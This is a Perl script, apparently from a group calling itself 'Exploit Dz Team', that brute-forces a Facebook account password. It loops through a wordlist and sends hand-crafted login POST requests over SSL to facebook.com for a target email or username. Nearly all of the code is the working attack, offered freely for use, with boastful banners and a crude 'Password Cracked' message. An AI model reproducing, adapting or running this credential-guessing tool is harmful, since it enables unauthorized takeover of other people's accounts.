#!/usr/bin/perl
#[~] =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=[~]
#[~] =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=[~]
#
#[~] Programmed by a Big programmer from algeria ==> "ExploitDzTeam" :)
#[~] By Team */ Exploit Dz Team  /*
#[~] We are : ayman-dz [~] hacking [~]Parrot Os[~] Linux[~] Ubuntu[~] &&&&& ==>
#    ==>   [~] 0dAy-Dz [~] Os Linux [~]love Dz [~] big-dzX [~] root Robot "Me" [~] Tnx To all My Team ^_^ *-*
#
#[~] =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+==+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=[~]
#[~] =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=[~]






use strict;
use Net::SSLeay::Handle;

if(!defined($ARGV[0] && $ARGV[1])) {

system('clear');
print "\n                         ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ \n";
print "                        |«       Script bruteforce account facebook With SSL Option's       ^^ »| \n";
print "                         ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ \n\n";
print "\0  .88b  d88. d8888b.      d8888b.  .d88b.  d8888b.  .d88b.  d888888b     d8888b. d8888b. db    db d888888b d88888b d8888b.      d88888b d8888b. \n";
print "  88'YbdP`88 88  `8D      88  `8D .8P  Y8. 88  `8D .8P  Y8. `~~88~~'     88  `8D 88  `8D 88    88 `~~88~~' 88'     88  `8D      88'     88  `8D \n";
print "  88  88  88 88oobY'      88oobY' 88    88 88oooY' 88    88    88        88oooY' 88oobY' 88    88    88    88ooooo 88oobY'      88ooo   88oooY' \n";
print "  88  88  88 88`8b        88`8b   88    88 88~~~b. 88    88    88        88~~~b. 88`8b   88    88    88    88~~~~~ 88`8b   «==» 88~~~   88~~~b. \n";
print "  88  88  88 88 `88.  ++  88 `88. `8b  d8' 88   8D `8b  d8'    88    ++  88   8D 88 `88. 88b  d88    88    88.     88 `88.      88      88   8D \n";
print "  YP  YP  YP 88   YD  ++  88   YD  `Y88P'  Y8888P'  `Y88P'     YP    ++  Y8888P' 88   YD ~Y8888P'    YP    Y88888P 88   YD      YP      Y8888P' \n\n";
                                                                                                                                          
                                                       
print "\033[1;31m                           «======================================================================»\n";
print "                           «|~ Exploit Dz Team : This Script Its free To all users any problem asq me - fb/khelfatni ~|» \n";
print "\033[1;31m                           «======================================================================»\n";
print "\033[1;37m                           «|           ==>> Usage: perl $0 Login wordlist.txt          |»\n";
print "\033[1;37m                                   «=========================================================»\n\n\n\n\n\n\n\n\n\n";
print "Thnak you for using my Script\n\n";
exit; }

my $user = $ARGV[0];
my $wordlist = $ARGV[1];

open (LIST, $wordlist) || die "\n[-] No Wordlist Biiitch On $wordlist -__- \n";

print "                         ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ \n";
print "                        |«       Script bruteforce account facebook With SSL Option's       ^^ »| \n";
print "                         ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ \n\n";
print "\0  .88b  d88. d8888b.      d8888b.  .d88b.  d8888b.  .d88b.  d888888b     d8888b. d8888b. db    db d888888b d88888b d8888b.      d88888b d8888b. \n";
print "  88'YbdP`88 88  `8D      88  `8D .8P  Y8. 88  `8D .8P  Y8. `~~88~~'     88  `8D 88  `8D 88    88 `~~88~~' 88'     88  `8D      88'     88  `8D \n";
print "  88  88  88 88oobY'      88oobY' 88    88 88oooY' 88    88    88        88oooY' 88oobY' 88    88    88    88ooooo 88oobY'      88ooo   88oooY' \n";
print "  88  88  88 88`8b        88`8b   88    88 88~~~b. 88    88    88        88~~~b. 88`8b   88    88    88    88~~~~~ 88`8b   «==» 88~~~   88~~~b. \n";
print "  88  88  88 88 `88.  ++  88 `88. `8b  d8' 88   8D `8b  d8'    88    ++  88   8D 88 `88. 88b  d88    88    88.     88 `88.      88      88   8D \n";
print "  YP  YP  YP 88   YD  ++  88   YD  `Y88P'  Y8888P'  `Y88P'     YP    ++  Y8888P' 88   YD ~Y8888P'    YP    Y88888P 88   YD      YP      Y8888P' \n\n";

                                                       
print "\033[1;31m                   «======================================================================»\n";
print "                   «|~ Exploit Dz Team : This Script Its free To all users any problem asq me - fb/khelfatni ~|» \n";
print "\033[1;31m                   «======================================================================»\n";
print "\033[1;37m                             «|     ==>> Usage: perl $0 Login wordlist.txt     |»\n";
print "\033[1;37m                             «=====================================================»\n\n\n";
print "\n[+] Now Cracking ==> Email Or User Account is :  $user ...\n";
print "\nــــــــــــــــــــــــــــــــــــــــ\n\n";

while (my $password = <LIST>) {
chomp ($password);
$password =~ s/([^^A-Za-z0-9\-_.!~*'()])/ sprintf "%%%0x", ord $1 /eg;

my $a = "POST /login.php HTTP/1.1";
my $b = "Host: www.facebook.com";
my $c = "Connection: close";
my $e = "Cache-Control: max-age=0";
my $f = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
my $g = "Origin: https://www.facebook.com";
my $h = "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24";
my $i = "Content-Type: application/x-www-form-urlencoded";
my $j = "Accept-Encoding: gzip,deflate,sdch";
my $k = "Accept-Language: en-US,en;q=0.8";
my $l = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3";

my $cookie = "cookie: datr=80ZzUfKqDOjwL8pauwqMjHTa";
my $post = "lsd=AVpD2t1f&display=&enable_profile_selector=&legacy_return=1&next=&profile_selector_ids=&trynum=1&timezone=300&lgnrnd=031110_Euoh&lgnjs=1366193470&email=$user&pass=$password&default_persistent=0&login=Log+In";
my $cl = length($post);
my $d = "Content-Length: $cl";


my ($host, $port) = ("www.facebook.com", 443);

tie(*SSL, "Net::SSLeay::Handle", $host, $port);
  

print SSL "$a\n";
print SSL "$b\n";
print SSL "$c\n";
print SSL "$d\n";
print SSL "$e\n";
print SSL "$f\n";
print SSL "$g\n";
print SSL "$h\n";
print SSL "$i\n";
print SSL "$j\n";
print SSL "$k\n";
print SSL "$l\n";
print SSL "$cookie\n\n";

print SSL "$post\n";

my $success;
while(my $result = <SSL>){
if($result =~ /Location(.*?)/){
$success = $1;
}
}
if (!defined $success)
{
print "[-] $password -> Password Not Found  \n";
close SSL;
}
else
{
print "\n\n\n\n               =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=»\n";
print "               «[~] yeah :o !! Password Cracked enjoy => Pass is :       »\n";
print "               «ـــــــــــــــــــــــــــــــــــــــــــــــــــــــ»\n";
print "               «           $password                »\n";
print "               «ـــــــــــــــــــــــــــــــــــــــــــــــــــــــ»\n";
print "               ««««««««««««« Enjooooy fuckkkk hhhhhhhhhhhhh »»»»»»»»»»»\n";
print "               «ـــــــــــــــــــــــــــــــــــــــــــــــــــــــ»\n\n";
close SSL;
exit;
}
}
